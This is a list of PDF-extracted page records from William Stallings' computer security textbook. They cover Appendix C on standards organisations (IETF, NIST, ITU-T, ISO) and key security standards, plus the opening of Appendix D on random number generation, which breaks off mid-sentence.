       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 908, 'page_label': 'C-1'}, page_content='C-1\\nAPPENDIX C\\nStANDArDS AND StANDArD-SEttINg \\nOrgANIzAtIONS\\nC.1 The Importance of Standards\\nC.\\n2\\n Internet Standards and the Internet Society\\nT\\nhe Internet Organizations and RFC Publication\\nThe Standardization Process\\nInternet Standards Categories\\nOther RFC Types\\nC.3\\n The National Institute of Standards and Technology\\nC.\\n4\\n The International Telecommunication Union\\nITU \\nTelecommunication Standardization Sector\\nSchedule\\nC.5\\n The International Organization for Standardization\\nC.\\n6\\n Significant Security Standards and Documents\\nInternational Or\\nganization for Standardization (ISO)\\nNational Institute of Standards and Technology (NIST)\\nInternational Telecommunication Union Telecommunication \\n Standar\\ndization Sector (ITU-T)\\nCommon Criteria for Information Technology Security Evaluation\\nInternet Standards and the Internet Society\\nZ06_STAL0611_04_GE_APPC.indd   1 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 909, 'page_label': 'C-2'}, page_content='C-2  APPENDIX C / ST ANDARDS AND STANDARD-SETTING ORGANIZATIONS\\nAn important concept that recurs frequently in this text is standards. This  a ppendix pro-\\nvides some background on the nature and relevance of standards and looks at the key \\norganizations involved in developing standards for networking and communications.\\n C.1  THE IMPOR TANCE OF STANDARDS\\nIt has long been accepted in the telecommunications industry that standards are \\nrequired to govern the physical, electrical, and procedural characteristics of commu-\\nnication equipment. In the past, this view has not been embraced by the computer \\nindustry. Whereas communication equipment vendors recognize that their equip-\\nment will generally interface to and communicate with other vendors’ equipment, \\ncomputer vendors have traditionally attempted to monopolize their customers. The \\nproliferation of computers and distributed processing has made that an untenable \\nposition. Computers from different vendors must communicate with each other \\nand, with the ongoing evolution of protocol standards, customers will no longer \\naccept special-purpose protocol conversion software development. The result is \\nthat standards now permeate all the areas of technology discussed in this text.\\nThere are a number of advantages and disadvantages to the standards-  \\nmaking pr\\nocess. The principal advantages of standards are:\\n•\\n A standar\\nd assures that there will be a large market for a particular piece of \\nequipment or software. This encourages mass production and, in some cases, \\nthe use of large-scale-integration (LSI) or very-large-scale-integration (VLSI) \\ntechniques, resulting in lower costs.\\n•\\n A standar\\nd allows products from multiple vendors to communicate, giving the \\npurchaser more flexibility in equipment selection and use.\\nThe principal disadvantages of standards are:\\n•\\n A standar\\nd tends to freeze the technology. By the time a standard is developed, \\nsubjected to review and compromise, and promulgated, more efficient tech-\\nniques are possible.\\n•\\n T\\nhere are multiple standards for the same thing. This is not a disadvantage \\nof standards per se, but of the current way things are done. Fortunately, in \\nrecent years the various standards-making organizations have begun to cooper-\\nate more closely. Nevertheless, there are still areas where multiple conflicting \\nstandards exist.\\nVarious organizations have been involved in the development of standards \\nrelated to data and computer communications. The remainder of this document \\nprovides an overview of some of the most important of these organizations:\\n•\\n Internet Society\\n•\\n NIS\\nT\\n•\\n ITU-T\\n•\\n ISO\\n•\\n IEEE\\nZ06_STAL0611_04_GE_APPC.indd   2 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 910, 'page_label': 'C-3'}, page_content='C.2 / INTERNET STANDARDS AND THE INTERNET SOCIETY  C-3\\n C.2 INTERNET STAND ARDS AND THE INTERNET SOCIETY\\nMany of the protocols that make up the TCP/IP protocol suite have been \\n standardized \\nor are in the process of standardization. By universal agreement, an \\norganization known as the Internet Society is responsible for the development and \\npublication of these standards. The Internet Society is a professional membership \\norganization that oversees a number of boards and task forces involved in Internet \\ndevelopment and standardization.\\nThis section provides a brief description of the way in which standards for \\nthe TCP/IP protocol suite are developed.\\nThe Internet Organizations and RFC Publication\\nThe Internet Society is the coordinating committee for Internet design,  engin eering, \\nand management. Areas covered include the operation of the Internet itself and \\nthe standardization of protocols used by end systems on the Internet for interop-\\nerability. Three organizations under the Internet Society are responsible for the \\nactual work of standards development and publication:\\n• Internet Architectur\\ne Board (IAB):  Responsible for defining the over -\\nall  architectur\\ne of the Internet, providing guidance and broad direction to  \\nthe IETF\\n• Inte\\nrnet Engineering Task Force (IETF): Th\\ne protocol engineering and devel-\\nopment arm of the Internet\\n• Internet Engineering Steering Group (IESG): Responsible for technical man-\\nagement of IETF activities and the Internet standards process\\nWorking groups chartered by the IETF carry out the actual development of \\nnew standards and protocols for the Internet. Membership in a working group is \\nvoluntary; any interested party may participate. During the development of a speci-\\nfication, a working group will make a draft version of the document available as \\nan Internet Draft, which is placed in the IETF’s “Internet Drafts” online directory. \\nThe document may remain as an Internet Draft for up to six months, and interested \\nparties may review and comment on the draft. During that time, the IESG may \\napprove publication of the draft as an RFC (Request for Comment). If the draft has \\nnot progressed to the status of an RFC during the six-month period, it is withdrawn \\nfrom the directory. The working group may subsequently publish a revised version \\nof the draft.\\nThe IETF is responsible for publishing the RFCs, with approval of the \\nIESG. The RFCs are the working notes of the Internet research and development \\ncommunity. A document in this series may be on essentially any topic related to \\ncomputer communications, and may be anything from a meeting report to the \\nspecification of a standard.\\nThe work of the IETF is divided into eight areas, each with an area director \\nand each composed of numerous working groups. \\nTable C.1 shows the IETF areas \\nand their focus.\\nZ06_STAL0611_04_GE_APPC.indd   3 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 911, 'page_label': 'C-4'}, page_content='C-4  APPENDIX C / STAND ARDS AND STANDARD-SETTING ORGANIZATIONS\\nIETF Area Theme Example Working Groups\\nApplications Internet applications Web-related protocols (HTTP)\\nEDI-Internet integration\\nLDAP\\nGeneral IETF processes and procedures Policy Framework\\nProcess for Organization of Internet \\nStandards\\nInternet Internet infrastructure IPv6\\nPPP extensions\\nOperations and \\nmanagement\\nStandards and definitions  \\nfor  network operations\\nSNMPv3\\nR\\nemote Network Monitoring\\nReal-time applications \\nand infrastructure\\nProtocols and applications  \\nfor  real-time r\\nequirements\\nReal-time Transport Protocol (RTP)\\nSession Initiation Protocol (SIP)\\nRouting Protocols and management  \\nfor routing information\\nmulticast routing\\nOSPF\\nQoS routing\\nSecurity Security protocols and \\ntechnologies\\nKerberos\\nIPSec\\nX.509\\nS/MIME\\nTLS\\nTransport Transport layer protocols Differentiated services\\nIP telephony\\nNFS\\nRSVP\\nTable C.1   IETF Areas\\nThe Standardization Process\\nThe decision of which RFCs become Internet standards is made by the IESG, on \\nthe recommendation of the IETF. To become a standard, a specification must meet \\nthe following criteria:\\n• Be stable and well understood,\\n• Be technically competent,\\n• Have multiple\\n, independent, and interoperable implementations with substan-\\ntial operational experience,\\n• Enjoy significant public support, and\\n• Be recognizably useful in some or all parts of the Internet.\\nThe key difference between these criteria and those used for international \\nstandards from ITU is the emphasis here on operational experience.\\nThe left-hand side of \\nFigure C.1 shows the series of steps, called the  standards\\n \\ntrack, that a specification goes through to become a standard; this process is defined \\nin RFC 2026. The steps involve increasing amounts of scrutiny and  testing.\\n At each \\nstep, the IETF must make a recommendation for advancement of the protocol, \\nand the IESG must ratify it. The process begins when the IESG approves the \\nZ06_STAL0611_04_GE_APPC.indd   4 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 912, 'page_label': 'C-5'}, page_content='C.2 / INTERNET STANDARDS AND THE INTERNET SOCIETY  C-5\\npublication of an Internet Draft document as an RFC with the status of Proposed \\nStandard.\\nThe white boxes in the diagram represent temporary states, which should \\nbe occupied for the minimum practical time. However, a document must remain \\na Proposed Standard for at least six months and a Draft Standard for at least \\nfour months to allow time for review and comment. The shaded boxes represent \\n long-term states that ma\\ny be occupied for years.\\nFor a specification to be advanced to Draft Standard status, there must be at \\nleast two independent and interoperable implementations from which adequate \\noperational experience has been obtained.\\nAfter significant implementation and operational experience has been \\nobtained, a specification may be elevated to Internet Standard. At this point, the \\nSpecification is assigned an STD number as well as an RFC number.\\nFinally, when a protocol becomes obsolete, it is assigned to the Historic state.\\nInternet Standards Categories\\nAll Internet standards fall into one of two categories:\\n•\\n T\\nechnical specification (TS):  A \\nTS defines a protocol, service, procedure, \\n con\\nvention, or format. The bulk of the Internet standards are TSs.\\n•\\n A\\npplicability statement (AS):  A\\nn AS specifies how, and under what circum -\\nstances, one or more TSs may be applied to support a particular Internet capa-\\nbility. An AS identifies one or more TSs that are relevant to the capability, and \\nmay specify values or ranges for particular parameters associated with a TS or \\nfunctional subsets of a TS that are relevant for the capability.\\nFigure C.1 Internet RFC Public ation Process\\nBest Current\\nPractice\\nProposed\\nStandard\\nDraft\\nStandard\\nInternet\\nStandard\\nHistoric\\nInternet\\nDraft\\nExperimental Informational\\nZ06_STAL0611_04_GE_APPC.indd   5 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 913, 'page_label': 'C-6'}, page_content='C-6  APPENDIX C / ST ANDARDS AND STANDARD-SETTING ORGANIZATIONS\\nOther RFC Types\\nThere are numerous RFCs that are not destined to become Internet standards. \\nSome RFCs standardize the results of community deliberations about statements of \\nprinciple or conclusions about what is the best way to perform some operations or \\nIETF process function. Such RFCs are designated as Best Current Practice (BCP). \\nApproval of BCPs follows essentially the same process for approval of Proposed \\nStandards. Unlike standards-track documents, there is not a three-stage process for \\nBCPs; a BCP goes from Internet draft status to approved BCP in one step.\\nA protocol or other specification that is not considered ready for standard-\\nization may be published as an Experimental RFC. After further work, the speci-\\nfication may be resubmitted. If the specification is generally stable, has resolved \\nknown design choices, is believed to be well understood, has received significant \\ncommunity review, and appears to enjoy enough community interest to be consid-\\nered valuable, then the RFC will be designated a Proposed Standard.\\nFinally, an Informational Specification is published for the general informa-\\ntion of the Internet community.\\n C.3  THE N ATIONAL INSTITUTE OF STANDARDS  \\nAND TECHNOLOGY\\nThe National Institute of Standards and Technology (NIST), part of the U.S. \\n Commer\\nce Department, issues standards and guidelines for use by U.S. govern-\\nment departments and agencies. These standards and guidelines are issued in the \\nform of Federal Information Processing Standards (FIPS). NIST develops FIPS \\nwhen there are compelling federal government requirements such as for security \\nand interoperability and there are no acceptable industry standards or solutions.\\n•\\n NIS\\nT announces the proposed FIPS in the Federal Register for public review and \\ncomment. At the same time that the proposed FIPS is announced in the Federal \\nRegister, it is also announced on NIST’s website. The text and associated speci-\\nfications, if applicable, of the proposed FIPS are posted on the NIST Web site.\\n•\\n A 90-da\\ny period is provided for review and for submission of comments on \\nthe proposed FIPS to NIST. The date by which comments must be submitted \\nto NIST is specified in the Federal Register and in the other announcements.\\n•\\n Comments r\\neceived in response to the Federal Register notice and to the other \\nnotices are reviewed by NIST to determine if modifications to the proposed \\nFIPS are needed.\\n•\\n A detailed justification document is pr\\nepared, analyzing the comments received \\nand explaining whether modifications were made, or explaining why recom -\\nmended changes were not made.\\n•\\n NIS\\nT submits the recommended FIPS, the detailed justification document, and \\nrecommendations as to whether the standard should be compulsory and bind-\\ning for Federal government use, to the Secretary of Commerce for approval.\\n•\\n A\\n notice announcing approval of the FIPS by the Secretary of Commerce is \\npublished in the Federal Register, and on NIST’s website.\\nZ06_STAL0611_04_GE_APPC.indd   6 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 914, 'page_label': 'C-7'}, page_content='C.4 / THE INTERNATIONAL TELECOMMUNICATION UNION  C-7\\nAlthough NIST standards are developed for U.S. government use, many of \\nthem are widely used in industry. AES and DES are prime examples.\\n C.4  THE INTERN ATIONAL TELECOMMUNICATION UNION\\nThe International Telecommunication Union (ITU) is a United Nations special-\\nized agency. Hence, the members of ITU-T are governments. The U.S. represen-\\ntation is housed in the Department of State. The charter of the ITU is that it \\n“is responsible for studying technical, operating, and tariff questions and issuing \\nRecommendations on them with a view to standardizing telecommunications on \\na worldwide basis.” Its primary objective is to standardize, to the extent necessary, \\ntechniques and operations in telecommunications to achieve end-to-end compat-\\nibility of international telecommunication connections, regardless of the countries \\nof origin and destination.\\nITU Telecommunication Standardization Sector\\nThe ITU-T was created on March 1 1993 as one consequence of a reform process \\nwithin the ITU. It replaces the International Telegraph and Telephone Consultative \\nCommittee (CCITT), which had essentially the same charter and objectives as the \\nnew ITU-T. The ITU-T fulfills the purposes of the ITU relating to telecommuni-\\ncations standardization by studying technical, operating and tariff questions and \\nadopting Recommendations on them with a view to standardizing telecommunica-\\ntions on a worldwide basis.\\nITU-T is organized into 14 study groups that prepare Recommendations, \\nnumbered as follows:\\n1.\\n Network and service oper\\nation\\n2.\\n T\\nariff and accounting principles\\n3.\\n T\\nelecommunications management network and network maintenance\\n4.\\n Pr\\notection against electromagnetic environment effects\\n5.\\n Outside plant\\n6.\\n Integr\\nated broadband cable networks and television and sound transmission\\n7.\\n Signaling r\\nequirements and protocols\\n8.\\n P\\nerformance and quality of service\\n9.\\n Next gener\\nation networks\\n10.\\n Optical and other tr\\nansport networks infrastructures\\n11.\\n Multimedia terminals\\n, systems, and applications\\n12.\\n Security\\n, languages, and telecommunication software\\n13.\\n Mobile telecommunications networks\\nSchedule\\nWork within ITU-R and ITU-T is conducted in a four-year cycle. Every four years, a \\nWorld Telecommunications Standardization Conference is held. The work program \\nZ06_STAL0611_04_GE_APPC.indd   7 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 915, 'page_label': 'C-8'}, page_content='C-8  APPENDIX C / ST ANDARDS AND STANDARD-SETTING ORGANIZATIONS\\nfor the next four years is established at the assembly in the form of questions submit-\\nted by the various study groups, based on requests made to the study groups by their \\nmembers. The conference assesses the questions, reviews the scope of the study groups, \\ncreates new or abolishes existing study groups, and allocates questions to them.\\nBased on these questions, each study group prepares draft Recommenda-\\ntions. A draft Recommendation may be submitted to the next conference, four \\nyears hence, for approval. Increasingly, however, Recommendations are approved \\nwhen they are ready, without having to wait for the end of the four-year study \\nperiod. This accelerated procedure was adopted after the study period that ended \\nin 1988. Thus, 1988 was the last time that a large batch of documents was published \\nat one time as a set of Recommendations.\\n C.5  THE INTERN ATIONAL ORGANIZATION \\nFOR\\xa0STANDARDIZATION\\nThe International Organization for Standardization, or ISO, 1 is an international \\nagency for the development of standards on a wide range of subjects. It is a \\n voluntary\\n, \\nnontreaty organization whose members are designated standards bodies of partici-\\npating nations, plus nonvoting observer organizations. Although ISO is not a govern-\\nmental body, more than 70% of ISO member bodies are governmental standards \\ninstitutions or organizations incorporated by public law. Most of the remainders have \\nclose links with the public administrations in their own countries. The United States \\nmember body is the American National Standards Institute.\\nISO was founded in 1946 and has issued more than 12,000 standards in a \\nbroad range of areas. Its purpose is to promote the development of standardiza-\\ntion and related activities to facilitate international exchange of goods and services \\nand to develop cooperation in the sphere of intellectual, scientific, technological, \\nand economic activity. Standards have been issued to cover everything from screw \\nthreads to solar energy. One important area of standardization deals with the Open \\nSystems Interconnection (OSI) communications architecture and the standards at \\neach layer of the OSI architecture.\\nIn the areas of data communications and networking, ISO standards are actu-\\nally developed in a joint effort with another standards body, the International Elec-\\ntrotechnical Commission (IEC). IEC is primarily concerned with electrical and \\nelectronic engineering standards. In the area of information technology, the interests \\nof the two groups overlap, with IEC emphasizing hardware and ISO focusing on \\nsoftware. In 1987 , the two groups formed the Joint Technical Committee 1 (JTC 1). \\nThis committee has the responsibility of developing the documents that ultimately \\nbecome ISO (and IEC) standards in the area of information technology.\\n1ISO is not an acronym (in which case it would be IOS), but a word, derived from the Greek isos,  m eaning \\n“equal.”\\nZ06_STAL0611_04_GE_APPC.indd   8 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 916, 'page_label': 'C-9'}, page_content='C.5 / THE INTERNATIONAL ORGANIZATION FOR\\xa0STANDARDIZATION  C-9\\nThe development of an ISO standard from first proposal to actual publication \\nof the standard follows a six-step process. The objective is to ensure that the final \\nresult is acceptable to as many countries as possible. Briefly, the steps are:\\n1.\\n Pr\\noposal stage:  A new work item is assigned to the appr\\nopriate technical \\ncommittee, and within that technical committee, to the appropriate working \\ngroup.\\n2.\\n P\\nrepatory stage:  T\\nhe working group prepares a working draft. Successive \\nworking drafts may be considered until the working group is satisfied that it \\nhas developed the best technical solution to the problem being addressed. At \\nthis stage, the draft is forwarded to the working group’s parent committee for \\nthe consensus-building phase.\\n3.\\n Committee stage: As soon as a first commit\\ntee draft is available, it is registered \\nby the ISO Central Secretariat. It is distributed among interested members \\nfor balloting and technical comment. Successive committee drafts may be con-\\nsidered until consensus is reached on the technical content. Once consensus \\nhas been attained, the text is finalized for submission as a Draft International \\nStandard (DIS).\\n4.\\n Enquiry stage:  T\\nhe DIS is circulated to all ISO member bodies by the ISO \\nCentral Secretariat for voting and comment within a period of five months. \\nIt is approved for submission as a Final Draft International Standard (FDIS) \\nif a two-thirds majority is in favor and not more than one-quarter of the total \\nnumber of votes cast are negative. If the approval criteria are not met, the text \\nis returned to the originating working group for further study and a revised \\ndocument will again be circulated for voting and comment as a DIS.\\n5.\\n A\\npproval stage: T\\nhe Final Draft International Standard (FDIS) is circulated \\nto all ISO member bodies by the ISO Central Secretariat for a final yes/no \\nvote within a period of two months. If technical comments are received dur-\\ning this period, they are no longer considered at this stage, but registered for \\nconsideration during a future revision of the International Standard. The text \\nis approved as an International Standard if a two-thirds majority is in favor \\nand not more than one-quarter of the total number of votes cast are negative. \\nIf these approval criteria are not met, the standard is referred back to the origi-\\nnating working group for reconsideration in the light of the technical reasons \\nsubmitted in support of the negative votes received.\\n6.\\n Public\\nation stage:  Once a F\\ninal Draft International Standard has been \\napproved, only minor editorial changes, if and where necessary, are introduced \\ninto the final text. The final text is sent to the ISO Central Secretariat, which \\npublishes the International Standard.\\nThe process of issuing an ISO standard can be a slow one. Certainly, it would \\nbe desirable to issue standards as quickly as the technical details can be worked \\nout, but ISO must ensure that the standard will receive widespread support.\\nZ06_STAL0611_04_GE_APPC.indd   9 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 917, 'page_label': 'C-10'}, page_content='C-10  APPENDIX C / STANDARDS AND ST ANDARD-SETTING ORGANIZATIONS\\n C.6 SIGNIFICANT SECURITY STAND ARDS AND DOCUMENTS\\nThere is an overwhelming amount of material, including books, papers, and online \\nresources, on computer security. Perhaps the most useful and definitive source of \\ninformation is a collection of standards and specifications from standards-making \\nbodies and from other sources whose work has widespread industry and  government \\napproval. We list some of the most important sources in this appendix.\\nInternational Organization for Standardization (ISO)\\nAn increasingly popular standard for writing and implementing security policies is \\nISO\\xa027002 (Code of Practice for Information Security Management). ISO 27002 is a \\ncomprehensive set of controls comprising best practices in information security. It is \\nessentially an internationally recognized generic information security standard. It is \\none of the 27000 family of related standards that we discuss in \\nChapter 14. The standard \\ncovers the following areas in some detail: risk assessment; policy; organization of infor-\\nmation security; asset management; human resources security; physical security; com-\\nmunications security; access control; IS acquisition, development, and maintenance; \\nsecurity incident management; business continuity management; and compliance.\\nWith the increasing interest in security, ISO 27002 certification, provided by \\nvarious accredited bodies, has been established as a goal for many corporations, gov-\\nernment agencies, and other organizations around the world. ISO 27002 offers a \\nconvenient framework to help security policy writers to structure their policies in \\naccordance with an international standard. Other ISO standards mentioned in the \\ntext are noted in the “List of NIST and ISO Documents” .\\nNational Institute of Standards and Technology (NIST)\\nNIST has produced a large number of Federal Information Processing Standards Pub-\\nlications (FIPS PUBs) and special publications (SPs) that are enormously useful to \\nsecurity managers, designers, and implementers. We mention here a few of the most \\nsignificant and general. with others referenced in the text noted in the “List of NIST \\nand ISO Documents” . FIPS PUB 200 (Minimum Security Requirements for Federal \\nInformation and Information Systems) is a standard that specifies minimum security \\nrequirements in 17 security-related areas with regard to protecting the confidentiality, \\nintegrity, and availability of federal information systems and the information processed, \\nstored, and transmitted by those systems. FIPS PUB 200 is discussed in Section 1.3.\\nNIST SP 800-100 (Information Security Handbook: A Guide for Managers) pro-\\nvides a broad overview of information security program elements to assist managers \\nin understanding how to establish and implement an information security program. \\nIts topical coverage overlaps considerably with ISO 27002.\\nSeveral other NIST publications are of general interest. SP 800-55  (Security \\nMetrics Guide for Information Technology Systems ) provides guidance on how an \\norganization, through the use of metrics, identifies the adequacy of in-place secu-\\nrity controls, policies, and procedures. SP 800-27 [Engineering Principles for Infor-\\nmation Technology Security (A Baseline for Achieving Security)] presents a list of \\nZ06_STAL0611_04_GE_APPC.indd   10 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 918, 'page_label': 'C-11'}, page_content='C.6 / SIGNIFICANT SECURITY STANDARDS AND DOCUMENTS  C-11\\nsystem-level security principles to be considered in the design, development, and \\noperation of an information system. SP 800-53 (Recommended Security Controls for \\nFederal Information Systems) lists management, operational, and technical safeguards \\nor countermeasures prescribed for an information system to protect the confidential-\\nity, integrity, and availability of the system and its information. Other NIST standards \\nmentioned in the text are noted in the “List of NIST and ISO Documents”.\\nInternational Telecommunication Union \\n Telecommunication Standardization Sector (ITU-T)\\nITU-T has issued the X.800 series of Recommendations covering security for data \\nnetworks. Perhaps the most important is X.800  (Security Architecture for Open \\nSystems Interconnection ), which provides a detailed overview of security threats, \\nservices, and mechanisms. X.800 is discussed in Section 1.4. X.810 (Security Frame-\\nworks for Open Systems: Overview ) provides more detail on the topics introduced \\nin X.800 and introduces a framework for security services implementation.\\nThere are currently 20 Recommendations in the X.800 series. In addition to the \\nRecommendations just mentioned, there are Recommendations that cover authenti-\\ncation, access control, nonrepudiation, confidentiality, integrity, and audit and alarms.\\nCommon Criteria for Information Technology Security \\nEvaluation\\nThe Common Criteria is a joint international effort by a number of national stan -\\ndards organizations and government agencies. U.S participation is by NIST and the \\nNational Security Agency (NSA). CC defines a set of IT requirements of known \\nvalidity that can be used in establishing security requirements for prospective prod-\\nucts and systems. The CC also defines the Protection Profile (PP) construct that \\nallows prospective consumers or developers to create standardized sets of security \\nrequirements that will meet their needs. We discuss the Common Criteria in detail in \\nChapter 27 and reference these documents in a number of chapters.\\nInternet Standards and the Internet Society\\nMany of the protocols that make up the TCP/IP protocol suite have been standardized \\nor are in the process of standardization. By universal agreement, an organization known \\nas the Internet Society is responsible for the development and publication\\xa0of these stan-\\ndards. The Internet Society is a professional membership organization that oversees a \\nnumber of boards and task forces involved in Internet development and standardization.\\nAll official publications from the Internet Society are issued as Requests for \\nComments (RFCs). Some are informational; others are Internet Standards or specifi-\\ncations that may become Internet Standards. RFC 2196 (Site Security Handbook) cov-\\ners some of the same ground as ISO 27002 and SP 800-100. It is a guide to developing \\ncomputer security policies and procedures for sites that have systems on the Internet. \\nRFC 3552 (Guidelines for Writing RFC Text on Security Considerations ) provides \\nguidelines to RFC authors on how to include security considerations in the RFC. It \\ndiscusses the goals of security, the Internet threat model, and common security issues.\\nZ06_STAL0611_04_GE_APPC.indd   11 10/11/17   3:30 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 919, 'page_label': 'D-1'}, page_content='D-1\\nAPPENDIX D\\nRANDom AND PsEuDoRANDom NumbER \\nGENERAtIoN\\nD.1 The Use of Random Numbers\\nR\\nandomness\\nUnpredictability\\nD.2\\n Pseudorandom Number Generators (Prngs)\\nLinear Congruential Gener\\nators\\nCryptographically Generated Random Numbers\\nCyclic Encryption\\nDES Output Feedback Mode\\nANSI X9.17 PRNG\\nBlum Blum Shub Generator\\nD.3\\n True Random Number Generators\\nSk\\new\\nD.4\\n References\\nZ07_STAL0611_04_GE_APPD.indd   1 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 920, 'page_label': 'D-2'}, page_content='D-2  APPENDIX D / RANDOM AND PSEUDORANDOM NUMBER GENERATION\\nRandom numbers play an important role in the use of encryption for various \\n computer security applications.\\n In this section, we provide a brief overview of the \\nuse of random numbers in computer security, then look at some approaches to gen-\\nerating random numbers.\\n D.1 THE USE OF RANDOM NUMBERS\\nA number of network security algorithms based on cryptography make use of ran-\\ndom numbers, for example:\\n• Recipr\\nocal authentication schemes such as Kerberos (described in  Chapter\\xa023.1). \\nIn such schemes, random numbers are used for handshaking to prevent replay \\nattacks.\\n• Session key gener\\nation, whether done by a key distribution center or by one of \\nthe principals, as discussed in Chapter 23.\\n• Generation of k\\neys for the RSA public-key encryption algorithm (described \\nin Chapter 21.4).\\nThese applications give rise to two distinct and not necessarily compatible \\nrequirements for a sequence of random numbers: randomness, and unpredictability.\\nRandomness\\nTraditionally, the concern in the generation of a sequence of allegedly random \\n numbers has been that the sequence of numbers be random in some well-defined\\n \\nstatistical sense. The following two criteria are used to validate that a sequence of \\nnumbers is random:\\n• Uniform distribution: The distribution of numbers in the sequence should be \\nuniform;\\n that is, the frequency of occurrence of each of the numbers should be \\napproximately the same.\\n• Independence: No one value in the sequence can be inferr\\ned 